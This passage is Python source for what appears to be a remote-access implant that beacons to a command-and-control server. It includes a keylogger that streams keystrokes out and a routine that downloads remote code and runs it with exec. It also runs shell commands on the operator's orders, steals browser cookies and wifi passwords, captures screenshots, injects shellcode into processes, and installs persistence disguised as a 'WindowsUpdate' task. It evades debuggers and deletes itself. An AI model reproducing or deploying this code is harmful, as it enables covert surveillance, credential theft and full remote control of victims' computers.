        self.logger.debug("Keylogger start called")
        self.running.set()
        self.log = ""
        self._last_send_time = time.time()
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        self.logger.debug("Keylogger started and listener started")
        self._start_sending_thread()
        return {"status": "success", "message": "Keylogger started"}

    def _start_sending_thread(self):
        def send_loop():
            self.logger.debug("Keylogger sending thread started")
            while self.running.is_set():
                time.sleep(self.batch_interval)
                self._send_logs()
        threading.Thread(target=send_loop, daemon=True).start()

    def _on_key_press(self, key):
        if not self.running.is_set():
            self.logger.debug("Keylogger received key press but not running, ignoring")
            return
        self.logger.debug(f"Key pressed: {key}")
        try:
            char = str(key.char)
        except AttributeError:
            if key == key.space:
                char = " "
            elif key == key.enter:
                char = "\n"
            else:
                char = f"[{key}]"
        with self.lock:
            self.log += char
        if len(self.log) >= self.batch_size or (time.time() - self._last_send_time) >= self.batch_interval:
            self._send_logs()

    def _send_logs(self):
        if not self.ws_client or not self.running.is_set():
            self.logger.debug("Keylogger _send_logs: ws_client missing or not running")
            return
        with self.lock:
            if not self.log:
                self.logger.debug("Keylogger _send_logs: no logs to send")
                return
            data_to_send = self.log
            self.log = ""
            self._last_send_time = time.time()
        try:
            self.logger.debug(f"Keylogger _send_logs: sending {len(data_to_send)} chars")
            if self.ws_client and self.ws_client.socket:
                self.logger.debug(f"Emitting keylogger_data event with data: agent_id={self.ws_client.agent_id}, keys_length={len(data_to_send)}")
                self.ws_client.socket.emit('keylogger_data', {
                    'agent_id': self.ws_client.agent_id,
                    'keys': data_to_send,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                }, namespace='/keylogger')
                self.logger.debug("Keylogger _send_logs: sent successfully")
            else:
                self.logger.debug("Keylogger _send_logs: ws_client or socket not available")
        except Exception as e:
            self.logger.error(f"Failed to send keylogger data: {str(e)}")

    def stop(self):
        if not self.running.is_set():
            self.logger.debug("Keylogger stop called but not running")
            return {"status": "error", "message": "Keylogger not running"}
        
        self.logger.debug("Keylogger stop called")
        self.running.clear()
        if self.listener:
            self.listener.stop()
            self.logger.debug("Keylogger listener stopped")
            self.listener.join()
            self.logger.debug("Keylogger listener thread joined")
            self.listener = None
        else:
            self.logger.debug("Keylogger listener was None")
        self._send_logs()
        self.logger.debug("Keylogger stopped")
        return {"status": "success", "message": "Keylogger stopped"}

    def get_logs(self):
        with self.lock:
            logs = self.log
            self.log = ""
        return logs


# ======================
# Shellcode-Runner
# ======================
if platform.system() == 'Windows':
    class ShellcodeRunner:
        @staticmethod
        def execute_runner(runner_url):
            """Execute the runner script in one line and capture output"""
            try:
                # Create the one-liner command
                cmd = [
                    sys.executable,
                    "-c",
                    f"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);"
                    f"import requests;url='{runner_url}';exec(requests.get(url,verify=False).text)"
                ]
                
                # Run synchronously and capture output
                result = subprocess.run(
                    cmd,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=60
                )
                
                return {
                    'status': 'success',
                    'message': 'Runner script executed',
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
            except Exception as e:
                return {
                    'status': 'error',
                    'message': str(e)
                }
            


# ======================
# WebSocket Client
# ======================
class WebSocketClient:
    def __init__(self, agent_id, crypto, server_url, config, namespace):
        self.agent_id = agent_id
        self.crypto = crypto
        self.config = config
        self.namespace = namespace
        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
        self.socket = None
        self.connected = False
        self.current_dir = os.getcwd()
        self._setup_logger()
        self._connection_timeout = 10  # seconds

    def _setup_logger(self):
        self.logger = logging.getLogger('websocket')
        self.logger = logging.getLogger('agent')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def _setup_event_handlers(self):
        """Setup all WebSocket event handlers"""
        if self.namespace == '/terminal':
            @self.socket.on('execute_command', namespace='/terminal')
            def on_command(data):
                try:
                    self.logger.info(f"Executing command: {data.get('command')}")
                    
                    # Execute the command and get results
                    result = self._execute_command(data.get('command', ''))
                    
                    # Format the response properly
                    response = {
                        'agent_id': self.agent_id,
                        'command': data.get('command', ''),
                        'output': result.get('output', ''),
                        'error': result.get('error', ''),
                        'current_dir': result.get('current_dir', '')
                    }
                    
                    self.logger.debug(f"Sending command result: {response}")
                    self.socket.emit('command_result', response, namespace='/terminal')
                    
                except Exception as e:
                    self.logger.error(f"Command handling failed: {str(e)}")
                    self.socket.emit('command_result', {
                        'agent_id': self.agent_id,
                        'error': f"Command processing error: {str(e)}",
                        'current_dir': self.current_dir
                    }, namespace='/terminal')
            
            @self.socket.on('force_kill', namespace='/terminal')
            def on_force_kill(data):
                self._log_info("[!] Received forced kill command")
                self._immediate_self_destruct()

    def connect(self):
        try:
            self.logger.info(f"Connecting to WebSocket at {self.server_url} namespace {self.namespace}")
            
            self.socket = socketio.Client(
                ssl_verify=False,
                reconnection=True,
                reconnection_attempts=0,  # Unlimited reconnection attempts
                reconnection_delay=3000,
                logger=True,
                engineio_logger=True
            )

            # Add connection verification timeout
            connection_timeout = 10  # seconds
            connected_event = threading.Event()

            @self.socket.on('connect', namespace=self.namespace)
            def on_connect():
                self.logger.info(f"WebSocket connected on {self.namespace}, authenticating...")
                try:
                    auth_data = {
                        'agent_id': self.agent_id,
                        'auth_token': self.crypto.encrypt({
                            'agent_id': self.agent_id,
                            'timestamp': int(time.time())
                        })
                    }
                    self.socket.emit('agent_connect', auth_data, namespace=self.namespace)
                    self._setup_event_handlers()
                    self.connected = True
                    connected_event.set()
                except Exception as e:
                    self.logger.error(f"Authentication failed: {str(e)}")

            @self.socket.on('disconnect', namespace=self.namespace)
            def on_disconnect():
                self.logger.warning(f"WebSocket disconnected from {self.namespace}")
                self.connected = False

            # Start keep-alive ping thread
            def keep_alive_loop():
                while self.connected:
                    try:
                        self.socket.emit('keep_alive', {'agent_id': self.agent_id}, namespace=self.namespace)
                        self.logger.debug("Sent keep_alive ping")
                    except Exception as e:
                        self.logger.error(f"Failed to send keep_alive ping: {str(e)}")
                    time.sleep(25)
            threading.Thread(target=keep_alive_loop, daemon=True).start()

            # Connect with timeout
            self.socket.connect(
                self.server_url,
                headers={
                    'User-Agent': self.config.USER_AGENT,
                    'X-Agent-ID': self.agent_id
                },
                transports=['websocket'],
                namespaces=[self.namespace]
            )

            if not connected_event.wait(connection_timeout):
                self.logger.error("WebSocket connection timed out")
                return False
            
            self.logger.info("WebSocket connection established successfully")
            return True

        except Exception as e:
            self.logger.error(f"WebSocket connection failed: {str(e)}")
            return False
    
   
        
    def _execute_command(self, command):
        try:
            self.logger.info(f"Executing: {command}")
            
            # Handle CD command separately
            if command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                    return {
                        'output': f"Current directory is now: {self.current_dir}",
                        'current_dir': self.current_dir
                    }
                except Exception as e:
                    return {
                        'error': str(e),
                        'current_dir': self.current_dir
                    }

            # Execute regular commands
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )
            
            self.current_dir = os.getcwd()
            
            return {
                'output': result.stdout,
                'error': result.stderr,
                'current_dir': self.current_dir
            }
            
        except subprocess.TimeoutExpired:
            return {
                'error': 'Command timed out after 30 seconds',
                'current_dir': self.current_dir
            }
        except Exception as e:
            return {
                'error': str(e),
                'current_dir': self.current_dir
            }

    def disconnect(self):
        if self.socket:
            try:
                self.logger.info("Disconnecting WebSocket")
                self.socket.disconnect()
                self.socket = None
            except Exception as e:
                self.logger.error(f"Disconnect error: {str(e)}")
        self.connected = False

# ======================
# Main Agent Class
# ======================
class Agent:
    def __init__(self):
        self.config = Config()
        self.crypto = Crypto(self.config.AES_KEY, self.config.AES_IV)
        self.agent_id = self._generate_agent_id()
        self._setup_logger()
        self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
        self.keylogger = Keylogger()
        self.ws_client = None
        self.last_checkin = 0
        self.jitter = 0.3
        self._initial_checkin = None
        self._checkin_count = 0
        self._running = True
        self._executed_task_ids = set()

    def _setup_logger(self):
        self.logger = logging.getLogger('agent')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def _log(self, level, message):
        if level == 'debug':
            self.logger.debug(message)
        elif level == 'info':
            self.logger.info(message)
        elif level == 'warning':
            self.logger.warning(message)
        elif level == 'error':
            self.logger.error(message)

    def _log_error(self, message):
        self.logger.error(message)

    def _log_info(self, message):
        self.logger.info(message)

    def _generate_agent_id(self):
        return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"

    def _get_checkin_data(self):
        data = {
            "agent_id": self.agent_id,
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.platform(),
            "privilege": "admin" if (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != 'Windows' and os.getuid() == 0)  else "user",
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
            "checkin_interval": self.config.CHECKIN_INTERVAL,  
            "killdate": self.config.KILLDATE if self.config.KILLDATE_ENABLED else None  
        }

        if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
            data["credentials"] = {
                
                "wifi": CredentialHarvester.get_wifi_passwords()
            }
            if not self._initial_checkin:
                self._initial_checkin = time.time()
        
        if self.config.TAKE_SCREENSHOTS:
            
            if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    data["screenshot"] = screenshot

        self._checkin_count += 1
        return data
    
    def _immediate_self_destruct(self):
        """Force immediate termination with server notification"""
        try:
            # 1. Disconnect all active connections
            self.stop()
            
            # 2. Remove all persistence mechanisms
            self._remove_persistence()
            
            # 3. Additional cleanup - delete temporary files
            self._cleanup_temp_files()
            
            # 4. Try to notify server (best effort)
            try:
                requests.post(
                    f"{self.config.C2_SERVER}/api/agent_terminated",
                    data=self.crypto.encrypt({
                        "agent_id": self.agent_id,
                        "status": "killed",
                        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                    }),
                    headers={
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    },
                    timeout=2,
                    verify=False
                )
            except:
                pass
            
            # 5. Forceful process termination
            self._force_kill_process()
            
        except Exception as e:
            self._log_error(f"Termination error: {str(e)}")
        finally:
            os._exit(0)

    def _cleanup_temp_files(self):
        """Clean up any temporary files created by the agent"""
        try:
            temp_dirs = [
                os.path.join(os.getenv('TEMP'), 'cookie_stealer'),
                os.path.join(os.getenv('PUBLIC'), 'documents')
            ]
            
            for temp_dir in temp_dirs:
                try:
                    if os.path.exists(temp_dir):
                        shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        except:
            pass

    def _force_kill_process(self):
        """Platform-specific forceful process termination"""
        try:
            if platform.system() == "Windows":
                # Windows specific forceful termination
                import ctypes
                PROCESS_TERMINATE = 0x0001
                handle = ctypes.windll.kernel32.OpenProcess(
                    PROCESS_TERMINATE, 
                    False, 
                    os.getpid()
                )
                ctypes.windll.kernel32.TerminateProcess(handle, -1)
                ctypes.windll.kernel32.CloseHandle(handle)
            else:
                # Unix-like systems
                os.kill(os.getpid(), signal.SIGKILL)
        except:
            os._exit(0)



    def _check_killdate(self):
        try:
            # Skip if killdate is not enabled or empty
            if not self.config.KILLDATE_ENABLED or not self.config.KILLDATE:
                return False
                
            # Parse and compare dates
            current_datetime = datetime.now()
            killdatetime = datetime.strptime(self.config.KILLDATE, "%Y-%m-%d %H:%M")
            return current_datetime >= killdatetime
            
        except Exception as e:
            self._log_error(f"Error checking killdate: {str(e)}")
            return False
        
    def _self_destruct(self):
        """Remove persistence and delete itself"""
        self._log_info("[!] Kill command received - initiating self-destruct")
        
        # 1. Remove persistence
        self._remove_persistence()
        
        # 2. Notify C2 (try best effort but don't block if it fails)
        try:
            data = {
                "agent_id": self.agent_id,
                "message": "Kill command executed - self-destruct initiated",
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
            }
            
            requests.post(
                f"{self.config.C2_SERVER}/api/killdate_reached",
                data=self.crypto.encrypt(data),
                headers={
                    "User-Agent": self.config.USER_AGENT,
                    "Content-Type": "application/octet-stream"
                },
                timeout=5,  # Short timeout since we're shutting down
                verify=False
            )
        except Exception as e:
            self._log_error(f"Error notifying C2: {str(e)}")
        
        # 3. Delete itself
        self._delete_self()
        
        # 4. Exit
        sys.exit(0)
    
    def _remove_persistence(self):
        """Remove scheduled task and registry entries"""
        try:
            # Remove scheduled task
            task_name = "WindowsUpdate"  # Should match the name used in Persistence._create_scheduled_task()
            subprocess.run(['schtasks', '/Delete', '/TN', task_name, '/F'], 
                          creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Remove registry entries
            try:
                # Admin path
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo",
                                    0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "engine")
                winreg.DeleteValue(key, "lube")
                winreg.CloseKey(key)
            except WindowsError:
                try:
                    # Non-admin path
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                       r"Software\Microsoft\Accessibility\Setup",
                                       0, winreg.KEY_ALL_ACCESS)
                    winreg.DeleteValue(key, "engine")
                    winreg.DeleteValue(key, "lube")
                    winreg.CloseKey(key)
                except WindowsError:
                    pass
            
            # Remove Run key entry
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
                                   0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, task_name)
                winreg.CloseKey(key)
            except WindowsError:
                pass
                
        except Exception as e:
            self._log_error(f"Error removing persistence: {str(e)}")
    
    def _notify_killdate_reached(self):
        """Send notification to C2 that killdate was reached"""
        try:
            data = {
                "agent_id": self.agent_id,
                "message": "Killdate reached - self-destruct initiated",
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
            }
            
            requests.post(
                f"{self.config.C2_SERVER}/api/killdate_reached",
                data=self.crypto.encrypt(data),
                headers={
                    "User-Agent": self.config.USER_AGENT,
                    "Content-Type": "application/octet-stream"
                },
                timeout=10,
                verify=False
            )
        except Exception as e:
            self._log_error(f"Error notifying C2: {str(e)}")
    
    def _delete_self(self):
        """Delete the agent executable"""
        try:
            # Get current executable path
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            
            # Schedule deletion on next reboot since we can't delete a running executable
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.MoveFileExW(
                    exe_path,
                    None,
                    0x00000004  # MOVEFILE_DELAY_UNTIL_REBOOT
                )
                
                # Also try to delete immediately (won't work but might help in some cases)
                try:
                    os.remove(exe_path)
                except:
                    pass
        except Exception as e:
            self._log_error(f"Error scheduling self-deletion: {str(e)}")

    def _execute_task(self, task):
        try:
            task_id = task.get("task_id")
            task_id_str = str(task_id)
            self._log_info(f"Checking task ID: {task_id_str} (type: {type(task_id)})")
            self._log_info(f"Current executed task IDs: {self._executed_task_ids}")
            if task_id_str in self._executed_task_ids:
                self._log_info(f"Skipping execution of duplicate task with ID: {task_id_str}")
                return None
            else:
                self._log_info(f"Executing new task with ID: {task_id_str}")
                self._executed_task_ids.add(task_id_str)

            task_type = task.get("type")
            self._log_info(f"Received task: {json.dumps(task, indent=2)}")
            
            # Handle different task types from web interface
            if task_type == "websocket":
                action = task.get("action") or task.get("data", {}).get("action")
                if not action:
                    self._log_error("WebSocket task missing action parameter")
                    return {
                        "status": "error",
                        "message": "WebSocket task requires 'action' parameter"
                    }
                
                self._log_info(f"Processing WebSocket {action} request")
                
                if action == "start":
                    if not hasattr(self, 'ws_client') or not self.ws_client:
                        self._log_info("Initializing new WebSocket client")
                        self.ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config,
                            '/terminal'
                        )
                    
                    if not self.ws_client.connected:
                        self._log_info("Attempting WebSocket connection...")
                        if self.ws_client.connect():
                            return {
                                "status": "success",
                                "message": "WebSocket connected",
                                "action": "start"
                            }
                        else:
                            return {
                                "status": "error",
                                "message": "Failed to connect WebSocket",
                                "action": "start"
                            }
                    return {
                        "status": "success",
                        "message": "WebSocket already connected",
                        "action": "start"
                    }
                
                elif action == "stop":
                    if hasattr(self, 'ws_client') and self.ws_client and self.ws_client.connected:
                        self.ws_client.disconnect()
                        return {
                            "status": "success",
                            "message": "WebSocket disconnected",
                            "action": "stop"
                        }
                    return {
                        "status": "error",
                        "message": "No active WebSocket connection",
                        "action": "stop"
                    }
            
            elif task_type == "shell":
                # This matches the "shell" option in the web interface
                command = task.get("data", {}).get("cmd", "")
                if not command:
                    return {
                        "status": "error",
                        "message": "No command provided"
                    }
                
                current_dir = os.getcwd()
                
                if command.lower().startswith("cd "):
                    new_dir = command[3:].strip()
                    try:
                        if new_dir:
                            os.chdir(new_dir)
                        current_dir = os.getcwd()
                        return {
                            "status": "success",
                            "output": f"Current directory is now: {current_dir}",
                            "current_dir": current_dir
                        }
                    except Exception as e:
                        return {
                            "status": "error",
                            "error": str(e),
                            "current_dir": current_dir
                        }
                
                result = subprocess.run(
                    command,
                    shell=True,
                    cwd=current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=30
                )
                current_dir = os.getcwd()
                
                return {
                    "status": "success",
                    "output": result.stdout,
                    "error": result.stderr,
                    "current_dir": current_dir,
                    "terminal": True  # This flag helps the server identify terminal output
                }
            
            #Kill-pill
            elif task_type == "kill":
                if task.get("data", {}).get("force"):
                    # Send confirmation before killing
                    try:
                        requests.post(
                            f"{self.config.C2_SERVER}/api/agent_terminated",
                            data=self.crypto.encrypt({
                                "agent_id": self.agent_id,
                                "status": "killing",
                                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                            }),
                            headers={
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            },
                            timeout=2,
                            verify=False
                        )
                    except:
                        pass
                    
                    self._immediate_self_destruct()
                    return {"status": "killing"}
                
                # Normal kill with cleanup
                self._log_info("[!] Received kill command - initiating self-destruct")
                
                # Send confirmation first
                try:
                    requests.post(
                        f"{self.config.C2_SERVER}/api/agent_terminated",
                        data=self.crypto.encrypt({
                            "agent_id": self.agent_id,
                            "status": "killing",
                            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                        }),
                        headers={
                            "User-Agent": self.config.USER_AGENT,
                            "Content-Type": "application/octet-stream"
                        },
                        timeout=2,
                        verify=False
                    )
                except:
                    pass
                    
                self._self_destruct()
                return {"status": "destructing"}


            elif task_type == "shellcode":
                try:
                    runner_url = task.get("data", {}).get("runner_url")
                    
                    if not runner_url:
                        return {
                            "status": "error",
                            "message": "No runner URL provided"
                        }

                    self._log_info(f"Executing runner script from: {runner_url}")
                    
                    # Execute the runner script and capture output
                    result = ShellcodeRunner.execute_runner(runner_url)
                    
                    return {
                        "status": "success" if result.get('status') == 'success' else 'error',
                        "message": result.get('message', ''),
                        "stdout": result.get('stdout', ''),
                        "stderr": result.get('stderr', ''),
                        "returncode": result.get('returncode', None),
                        "details": result
                    }
                        
                except Exception as e:
                    self._log_error(f"Shellcode processing failed: {str(e)}")
                    return {
                        "status": "error",
                        "message": f"Shellcode execution failed: {str(e)}"
                    }



            elif task_type == "screenshot":
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    return {
                        "status": "success",
                        "screenshot": screenshot
                    }
                return {"status": "error", "message": "Failed to capture screenshot"}
            
            
            
            elif task_type == "steal_cookies":
                try:
                    self._log_info("Starting cookie stealing task")
                    stealer = CookieStealer(logger=self.logger)
                    results = stealer.steal_cookies()
                    
                    if not results:
                        return {
                            "status": "error",
                            "message": "No cookies were stolen"
                        }
                    
                    return {
                        "status": "success",
                        "message": f"Stole cookies from {len(results)} browsers",
                        "results": results
                    }
                except Exception as e:
                    self._log_error(f"Cookie stealing failed: {str(e)}")
                    return {
                        "status": "error",
                        "message": str(e)
                    }

            
            elif task_type == "upload":
                return SystemUtils.upload_file(task.get("path", ""))
            
            elif task_type == "download":
                return SystemUtils.download_file(
                    task.get("filename", ""), 
                    task.get("data", ""))
            
            elif task_type == "persist":
                self._log_info("Installing persistence")
                return Persistence.install(self.config.C2_SERVER)
            
            elif task_type == "inject":
                return ProcessInjector.inject_shellcode(
                    task.get("pid", 0),
                    base64.b64decode(task.get("shellcode", "")))
            
            elif task_type == "socks5":
                if task.get("action") == "start":
                    return self.socks_proxy.start()
                else:
                    return self.socks_proxy.stop()
            
            if task_type == "keylogger":
                action = task.get("action") or task.get("data", {}).get("action")
                if action == "start":
                    if not hasattr(self, 'keylogger_ws_client') or not self.keylogger_ws_client or not self.keylogger_ws_client.connected:
                        self.keylogger_ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config,
                            '/keylogger'
                        )
                    if self.keylogger_ws_client.connect():
                        self.keylogger.ws_client = self.keylogger_ws_client
                    else:
                        return {"status": "error", "message": "Failed to connect WebSocket for keylogger"}
                    return self.keylogger.start()
                elif action == "stop":
                    self._log_info("Stopping keylogger")
                    # Send any remaining logs before stopping
                    if self.keylogger.ws_client and self.keylogger.running:
                        self.keylogger._send_logs()
                    result = self.keylogger.get_logs()
                    self.keylogger.stop()
                    if hasattr(self, 'keylogger_ws_client') and self.keylogger_ws_client and self.keylogger_ws_client.connected:
                        self._log_info("Disconnecting keylogger WebSocket client")
                        self.keylogger_ws_client.disconnect()
                    self.keylogger.ws_client = None
                    self.keylogger_ws_client = None
                    return {"logs": result}
                
                else:
                    return {
                        "status": "error",
                        "message": f"Unknown task type: {task_type}"
                    }
        
        except Exception as e:
            self._log_error(f"Error executing task: {str(e)}")
            return {
                "status": "error",
                "message": f"Task execution failed: {str(e)}"
            }

    def beacon(self):
        self._log_info("[*] Starting beacon loop...")
        first_checkin = True  # Flag for first checkin
        
        while self._running:
            try:
                # Check killdate first
                if self._check_killdate():
                    self._self_destruct()
                    return 
                
                # Skip sleep for first checkin
                if not first_checkin:
                    sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
                    time.sleep(sleep_time)
                
                checkin_data = self._get_checkin_data()
                encrypted_data = self.crypto.encrypt(checkin_data)
                
                response = requests.post(
                    f"{self.config.C2_SERVER}/api/checkin",
                    data=encrypted_data,
                    headers={
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    },
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    task = self.crypto.decrypt(response.content)
                    
                    if task.get("type") != "noop":
                        result = self._execute_task(task)
                        
                        requests.post(
                            f"{self.config.C2_SERVER}/api/task_result",
                            data=self.crypto.encrypt({
                                "task_id": task.get("task_id"),
                                "agent_id": self.agent_id,
                                "task_type": task.get("type"),
                                "result": result
                            }),
                            headers={
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            },
                            timeout=30,
                            verify=False
                        )
                    if task.get("type") == "shellcode":
                        # Special handling for shellcode in headless mode
                        result = self._execute_task(task)
                        if result.get('status') == 'error':
                            self._log_error(f"Shellcode failed: {result['message']}")
                            continue
                        
                        # Don't wait for response in headless mode
                        continue
                
                # After first checkin, set flag to False
                if first_checkin:
                    first_checkin = False
                    
            except requests.exceptions.RequestException as e:
                self._log_error(f"Connection error: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)
            except Exception as e:
                self._log_error(f"Error in beacon: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)

    def stop(self):
        self._running = False
        self.socks_proxy.stop()
        self.keylogger.stop()
        if self.ws_client:
            self.ws_client.disconnect()

    def run(self):
        self._log_info("[*] Starting agent...")
        self.beacon()

if __name__ == "__main__":
    def is_debugging():
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent() != 0:
                    print("[!] Debugger detected - exiting")
                    return True
            return False
        except:
            return False
    
    if is_debugging():
        sys.exit(0)
    
    try:
        agent = Agent()
        agent.run()
    except Exception as e:
        print(f"[!] Agent crashed: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)